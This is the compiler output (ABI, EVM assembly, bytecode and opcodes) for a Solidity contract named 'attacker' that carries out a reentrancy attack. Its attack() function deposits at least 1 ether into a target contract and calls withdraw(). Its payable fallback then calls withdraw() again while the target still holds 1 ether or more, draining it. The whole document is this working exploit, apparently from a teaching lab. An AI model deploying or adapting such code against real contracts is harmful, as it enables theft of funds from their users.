{
	"attacker.sol": {
		"attacker": {
			"abi": [
				{
					"stateMutability": "payable",
					"type": "fallback"
				},
				{
					"inputs": [],
					"name": "AContract",
					"outputs": [
						{
							"internalType": "contract iContract",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"attacker.sol\":212:603  contract attacker {... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"attacker.sol\":212:603  contract attacker {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x9e5faafc\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xb424fb93\n      eq\n      tag_4\n      jumpi\n      jump(tag_2)\n    tag_1:\n    tag_2:\n        /* \"attacker.sol\":345:352  1 ether */\n      0x0de0b6b3a7640000\n        /* \"attacker.sol\":323:332  AContract */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"attacker.sol\":315:341  address(AContract).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"attacker.sol\":315:352  address(AContract).balance >= 1 ether */\n      lt\n        /* \"attacker.sol\":311:400  if (address(AContract).balance >= 1 ether){... */\n      tag_7\n      jumpi\n        /* \"attacker.sol\":368:377  AContract */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"attacker.sol\":368:386  AContract.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3ccfd60b\n        /* \"attacker.sol\":368:388  AContract.withdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_8\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_8:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_10\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_10:\n      pop\n      pop\n      pop\n      pop\n        /* \"attacker.sol\":311:400  if (address(AContract).balance >= 1 ether){... */\n    tag_7:\n        /* \"attacker.sol\":212:603  contract attacker {... */\n      stop\n        /* \"attacker.sol\":415:600  function attack() public  payable {... */\n    tag_3:\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      stop\n        /* \"attacker.sol\":237:263  iContract public AContract */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_13\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_13:\n      pop\n      tag_14\n      tag_15\n      jump\t// in\n    tag_14:\n      mload(0x40)\n      tag_16\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"attacker.sol\":415:600  function attack() public  payable {... */\n    tag_12:\n        /* \"attacker.sol\":480:487  1 ether */\n      0x0de0b6b3a7640000\n        /* \"attacker.sol\":468:477  msg.value */\n      callvalue\n        /* \"attacker.sol\":468:487  msg.value >=1 ether */\n      lt\n      iszero\n        /* \"attacker.sol\":460:512  require(msg.value >=1 ether, \"need 1 ether minimum\") */\n      tag_19\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_20\n      swap1\n      tag_21\n      jump\t// in\n    tag_20:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_19:\n        /* \"attacker.sol\":523:532  AContract */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"attacker.sol\":523:540  AContract.deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd0e30db0\n        /* \"attacker.sol\":549:558  msg.value */\n      callvalue\n        /* \"attacker.sol\":523:561  AContract.deposit{value : msg.value}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_22\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_22:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_24\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_24:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"attacker.sol\":572:581  AContract */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"attacker.sol\":572:590  AContract.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3ccfd60b\n        /* \"attacker.sol\":572:592  AContract.withdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_25\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_25:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_27\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_27:\n      pop\n      pop\n      pop\n      pop\n        /* \"attacker.sol\":415:600  function attack() public  payable {... */\n      jump\t// out\n        /* \"attacker.sol\":237:263  iContract public AContract */\n    tag_15:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_28:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:199   */\n    tag_29:\n        /* \"#utility.yul\":167:170   */\n      0x00\n        /* \"#utility.yul\":188:193   */\n      dup2\n        /* \"#utility.yul\":181:193   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:199   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":205:347   */\n    tag_30:\n        /* \"#utility.yul\":255:264   */\n      0x00\n        /* \"#utility.yul\":288:341   */\n      tag_41\n        /* \"#utility.yul\":306:340   */\n      tag_42\n        /* \"#utility.yul\":315:339   */\n      tag_43\n        /* \"#utility.yul\":333:338   */\n      dup5\n        /* \"#utility.yul\":315:339   */\n      tag_28\n      jump\t// in\n    tag_43:\n        /* \"#utility.yul\":306:340   */\n      tag_29\n      jump\t// in\n    tag_42:\n        /* \"#utility.yul\":288:341   */\n      tag_28\n      jump\t// in\n    tag_41:\n        /* \"#utility.yul\":275:341   */\n      swap1\n      pop\n        /* \"#utility.yul\":205:347   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":353:479   */\n    tag_31:\n        /* \"#utility.yul\":403:412   */\n      0x00\n        /* \"#utility.yul\":436:473   */\n      tag_45\n        /* \"#utility.yul\":467:472   */\n      dup3\n        /* \"#utility.yul\":436:473   */\n      tag_30\n      jump\t// in\n    tag_45:\n        /* \"#utility.yul\":423:473   */\n      swap1\n      pop\n        /* \"#utility.yul\":353:479   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":485:626   */\n    tag_32:\n        /* \"#utility.yul\":550:559   */\n      0x00\n        /* \"#utility.yul\":583:620   */\n      tag_47\n        /* \"#utility.yul\":614:619   */\n      dup3\n        /* \"#utility.yul\":583:620   */\n      tag_31\n      jump\t// in\n    tag_47:\n        /* \"#utility.yul\":570:620   */\n      swap1\n      pop\n        /* \"#utility.yul\":485:626   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":632:793   */\n    tag_33:\n        /* \"#utility.yul\":734:786   */\n      tag_49\n        /* \"#utility.yul\":780:785   */\n      dup2\n        /* \"#utility.yul\":734:786   */\n      tag_32\n      jump\t// in\n    tag_49:\n        /* \"#utility.yul\":729:732   */\n      dup3\n        /* \"#utility.yul\":722:787   */\n      mstore\n        /* \"#utility.yul\":632:793   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":799:1051   */\n    tag_17:\n        /* \"#utility.yul\":907:911   */\n      0x00\n        /* \"#utility.yul\":945:947   */\n      0x20\n        /* \"#utility.yul\":934:943   */\n      dup3\n        /* \"#utility.yul\":930:948   */\n      add\n        /* \"#utility.yul\":922:948   */\n      swap1\n      pop\n        /* \"#utility.yul\":958:1044   */\n      tag_51\n        /* \"#utility.yul\":1041:1042   */\n      0x00\n        /* \"#utility.yul\":1030:1039   */\n      dup4\n        /* \"#utility.yul\":1026:1043   */\n      add\n        /* \"#utility.yul\":1017:1023   */\n      dup5\n        /* \"#utility.yul\":958:1044   */\n      tag_33\n      jump\t// in\n    tag_51:\n        /* \"#utility.yul\":799:1051   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1057:1226   */\n    tag_34:\n        /* \"#utility.yul\":1141:1152   */\n      0x00\n        /* \"#utility.yul\":1175:1181   */\n      dup3\n        /* \"#utility.yul\":1170:1173   */\n      dup3\n        /* \"#utility.yul\":1163:1182   */\n      mstore\n        /* \"#utility.yul\":1215:1219   */\n      0x20\n        /* \"#utility.yul\":1210:1213   */\n      dup3\n        /* \"#utility.yul\":1206:1220   */\n      add\n        /* \"#utility.yul\":1191:1220   */\n      swap1\n      pop\n        /* \"#utility.yul\":1057:1226   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1232:1402   */\n    tag_35:\n        /* \"#utility.yul\":1372:1394   */\n      0x6e6565642031206574686572206d696e696d756d000000000000000000000000\n        /* \"#utility.yul\":1368:1369   */\n      0x00\n        /* \"#utility.yul\":1360:1366   */\n      dup3\n        /* \"#utility.yul\":1356:1370   */\n      add\n        /* \"#utility.yul\":1349:1395   */\n      mstore\n        /* \"#utility.yul\":1232:1402   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1408:1774   */\n    tag_36:\n        /* \"#utility.yul\":1550:1553   */\n      0x00\n        /* \"#utility.yul\":1571:1638   */\n      tag_55\n        /* \"#utility.yul\":1635:1637   */\n      0x14\n        /* \"#utility.yul\":1630:1633   */\n      dup4\n        /* \"#utility.yul\":1571:1638   */\n      tag_34\n      jump\t// in\n    tag_55:\n        /* \"#utility.yul\":1564:1638   */\n      swap2\n      pop\n        /* \"#utility.yul\":1647:1740   */\n      tag_56\n        /* \"#utility.yul\":1736:1739   */\n      dup3\n        /* \"#utility.yul\":1647:1740   */\n      tag_35\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":1765:1767   */\n      0x20\n        /* \"#utility.yul\":1760:1763   */\n      dup3\n        /* \"#utility.yul\":1756:1768   */\n      add\n        /* \"#utility.yul\":1749:1768   */\n      swap1\n      pop\n        /* \"#utility.yul\":1408:1774   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1780:2199   */\n    tag_21:\n        /* \"#utility.yul\":1946:1950   */\n      0x00\n        /* \"#utility.yul\":1984:1986   */\n      0x20\n        /* \"#utility.yul\":1973:1982   */\n      dup3\n        /* \"#utility.yul\":1969:1987   */\n      add\n        /* \"#utility.yul\":1961:1987   */\n      swap1\n      pop\n        /* \"#utility.yul\":2033:2042   */\n      dup2\n        /* \"#utility.yul\":2027:2031   */\n      dup2\n        /* \"#utility.yul\":2023:2043   */\n      sub\n        /* \"#utility.yul\":2019:2020   */\n      0x00\n        /* \"#utility.yul\":2008:2017   */\n      dup4\n        /* \"#utility.yul\":2004:2021   */\n      add\n        /* \"#utility.yul\":1997:2044   */\n      mstore\n        /* \"#utility.yul\":2061:2192   */\n      tag_58\n        /* \"#utility.yul\":2187:2191   */\n      dup2\n        /* \"#utility.yul\":2061:2192   */\n      tag_36\n      jump\t// in\n    tag_58:\n        /* \"#utility.yul\":2053:2192   */\n      swap1\n      pop\n        /* \"#utility.yul\":1780:2199   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212201c0230350bc86e74b1419e8aaeaaba772324cc2d6530187d81236f561be3957564736f6c63430008190033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052348015600e575f80fd5b506103ca8061001c5f395ff3fe60806040526004361061002c575f3560e01c80639e5faafc146100ef578063b424fb93146100f95761002d565b5b670de0b6b3a76400005f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106100ed575f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156100d6575f80fd5b505af11580156100e8573d5f803e3d5ffd5b505050505b005b6100f7610123565b005b348015610104575f80fd5b5061010d610266565b60405161011a9190610303565b60405180910390f35b670de0b6b3a764000034101561016e576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161016590610376565b60405180910390fd5b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004015f604051808303818588803b1580156101d3575f80fd5b505af11580156101e5573d5f803e3d5ffd5b50505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b15801561024e575f80fd5b505af1158015610260573d5f803e3d5ffd5b50505050565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f6102cb6102c66102c184610289565b6102a8565b610289565b9050919050565b5f6102dc826102b1565b9050919050565b5f6102ed826102d2565b9050919050565b6102fd816102e3565b82525050565b5f6020820190506103165f8301846102f4565b92915050565b5f82825260208201905092915050565b7f6e6565642031206574686572206d696e696d756d0000000000000000000000005f82015250565b5f61036060148361031c565b915061036b8261032c565b602082019050919050565b5f6020820190508181035f83015261038d81610354565b905091905056fea26469706673582212201c0230350bc86e74b1419e8aaeaaba772324cc2d6530187d81236f561be3957564736f6c63430008190033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xE JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x3CA DUP1 PUSH2 0x1C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2C JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0xEF JUMPI DUP1 PUSH4 0xB424FB93 EQ PUSH2 0xF9 JUMPI PUSH2 0x2D JUMP JUMPDEST JUMPDEST PUSH8 0xDE0B6B3A7640000 PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT PUSH2 0xED JUMPI PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xD6 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xE8 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH2 0xF7 PUSH2 0x123 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x104 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x10D PUSH2 0x266 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x11A SWAP2 SWAP1 PUSH2 0x303 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO PUSH2 0x16E JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x165 SWAP1 PUSH2 0x376 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1D3 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1E5 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x24E JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x260 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x2CB PUSH2 0x2C6 PUSH2 0x2C1 DUP5 PUSH2 0x289 JUMP JUMPDEST PUSH2 0x2A8 JUMP JUMPDEST PUSH2 0x289 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x2DC DUP3 PUSH2 0x2B1 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x2ED DUP3 PUSH2 0x2D2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2FD DUP2 PUSH2 0x2E3 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x316 PUSH0 DUP4 ADD DUP5 PUSH2 0x2F4 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x6E6565642031206574686572206D696E696D756D000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x360 PUSH1 0x14 DUP4 PUSH2 0x31C JUMP JUMPDEST SWAP2 POP PUSH2 0x36B DUP3 PUSH2 0x32C JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x38D DUP2 PUSH2 0x354 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SHR MUL ADDRESS CALLDATALOAD SIGNEXTEND 0xC8 PUSH15 0x74B1419E8AAEAABA772324CC2D6530 XOR PUSH30 0x81236F561BE3957564736F6C634300081900330000000000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "194000",
						"executionCost": "236",
						"totalCost": "194236"
					},
					"external": {
						"": "infinite",
						"AContract()": "infinite",
						"attack()": "infinite"
					}
				},
				"methodIdentifiers": {
					"AContract()": "b424fb93",
					"attack()": "9e5faafc"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 12,
						"contract": "attacker.sol:attacker",
						"label": "AContract",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(iContract)9"
					}
				],
				"types": {
					"t_contract(iContract)9": {
						"encoding": "inplace",
						"label": "contract iContract",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}